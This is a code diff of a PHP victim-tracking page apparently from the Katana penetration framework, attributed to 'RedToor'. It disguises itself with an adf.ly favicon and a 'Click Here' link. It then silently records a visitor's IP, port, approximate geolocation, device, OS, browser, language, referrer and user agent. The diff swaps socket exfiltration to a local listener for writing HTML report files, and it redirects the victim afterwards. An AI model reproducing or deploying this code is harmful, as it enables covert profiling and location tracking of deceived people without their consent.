@@ -6,31 +6,29 @@
    Date   : 04/12/2014 
    Date   : 22/12/2014
    Date   : 12/01/2015
-   Date   : 02/02/2015 VERSION FOR KATANA/framework
+   Data   : 12/05/2015 for Katana Framework
 
-    HOW to Works
-    to run this script is necessary that the victim has active JavaScript, 
-    also for geological location data requires that the victim accepts obtained.
+// I LOVE MO'
 
-/* /  files --------------------------------------------------------------  */
-/**/  include("appconfig.php");
-/* /  --------------------------------------------------------------------  */
+/* /  Setting --------------------*/
+/**/  include("appconfig.php"); /**/
+/* /  ----------------------------*/
 
 error_reporting(0);
 error_log(0);
 error_get_last(0);
 $id=$_GET['id'];
-if($_POST['geos']!=""){
-    $data =data();
+if($_POST['data']!=""){
+    $n=rand(0,9000);
+    $data ="<title>GetDataReport[by RedToor]</title><h1>REPORT</h1><br>";
+    $data.=$_POST['data'];
     $data.=$_POST['geos'];
-    $sock=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-    socket_connect($sock, "127.0.0.1", 4567);
-    socket_write($sock, $data);
-    socket_close($sock);
-    header("location:".$url);
+    $open=fopen("Report-".$n.".htm",'w') or die ('Failed');
+    fputs($open,$data);
+    fclose($open);
+    header("location: ".$url."");
 }else{
 global $ippostsow;
-
 function OS(){
         $system="unKnow";
         $os=array(
@@ -125,28 +123,30 @@ function device($unix){
                                 $unix=OS();
                                 $provetor=gethostbyaddr($_SERVER['REMOTE_ADDR']);
                                 $g=unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR'].''));
-function data(){
-                                $data.="Port               : ".$_SERVER['REMOTE_PORT'].        "\n";
-                                $data.="     Country Name       : ".$g['geoplugin_countryName'].    "\n";
-                                $data.="     Region             : ".$g['geoplugin_region'].         "\n";
-                                $data.="     City               : ".$g['geoplugin_city'].           "\n";
-                                $data.="     Longitude ,no exact: ".$g['geoplugin_longitude'].      "\n";
-                                $data.="     Latitude  ,no exact: ".$g['geoplugin_latitude'].       "\n";
-                                $data.="     Device             : ".device($unix).                  "\n";
-                                $data.="     Operative System   : ".OS().                           "\n";
-                                $data.="     Browser            : ".browser().                      "\n";
-                                $data.="     Language           : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."\n";
-                                $data.="     Provetor           : ".$provetor.                      "\n";
-                                $data.="     Referer            : ".$_SERVER['HTTP_REFERER'].       "\n";
-                                $data.="     Agent              : ".$_SERVER['HTTP_USER_AGENT'].    "\n";
-                                return $data;}                                
-                                if($javascript=="false"){
-                                $sock=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                                socket_connect($sock, "127.0.0.1", 4567);
-                                socket_write($sock, data());
-                                socket_close($sock);
-                                header("location:".$url);
-                                }else{?>
+                                $data ="<pre>";
+                                $data.="Target             : ".$id.                            "<br>";
+                                $data.="Ip                 : ".$_SERVER['REMOTE_ADDR'].        "<br>";
+                                $data.="Port               : ".$_SERVER['REMOTE_PORT'].        "<br>";
+                                $data.="Country Name       : ".$g['geoplugin_countryName'].    "<br>";
+                                $data.="Region             : ".$g['geoplugin_region'].         "<br>";
+                                $data.="City               : ".$g['geoplugin_city'].           "<br>";
+                                $data.="Longitude ,no exact: ".$g['geoplugin_longitude'].      "<br>";
+                                $data.="Latitude  ,no exact: ".$g['geoplugin_latitude'].       "<br>";
+                                $data.="Device             : ".device($unix).                  "<br>";
+                                $data.="Operative System   : ".OS().                           "<br>";
+                                $data.="Browser            : ".browser().                      "<br>";
+                                $data.="Language           : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."<br>";
+                                $data.="Provetor           : ".$provetor.                      "<br>";
+                                $data.="Referer            : ".$_SERVER['HTTP_REFERER'].       "<br>";
+                                $data.="Agent              : ".$_SERVER['HTTP_USER_AGENT'].    "<br>";
+                                $n=rand(0,9000);
+                                if($javascript=='false'){
+                                $datas ="<title>GetDataReport[by RedToor]</title><h1>REPORT</h1><br>";
+                                $datas.=$data;
+                                $open=fopen("Report-".$n.".htm",'w') or die ('Failed');
+                                fputs($open,$datas);
+                                fclose($open);
+                                header("location: ".$url."");}else{?>
 
                 <link rel="shortcut icon" href="http://cdn.adf.ly/static/image/favicon.ico"/><head>
                 <BODY BGCOLOR="#317EC5"><meta http-equiv="Content-type" content="text/html; charset=utf-8"/>
@@ -168,8 +168,8 @@ function data(){
 <div id="continue" style="display:none;">
 <div style="color: #FFFFFF; margin-top:20px;">
 <form action='<?php echo $_SERVER['SCRIPT_NAME'];?>' method=post name=datas>
-<input type=hidden name=geos><input type=hidden name=url value="<?php echo $url;?>"><input type=hidden name=ver value="yes">
-<input type=hidden name=id value="<?php echo $id;?>"><input type=hidden name=data value="">
+<input type=hidden name=geos><input type=hidden name=url value="<?php echo $_GET['url'];?>"><input type=hidden name=ver value="yes">
+<input type=hidden name=id value="<?php echo $id;?>"><input type=hidden name=data value="<?php echo $data;?>">
 <a style="color:#FFFFFF;" href="javascript:send()">Click Here.</a> </form></div></div>
 <script type="text/javascript">$('#wait').show();</script><noscript></body></html>
 <?php }} ?>
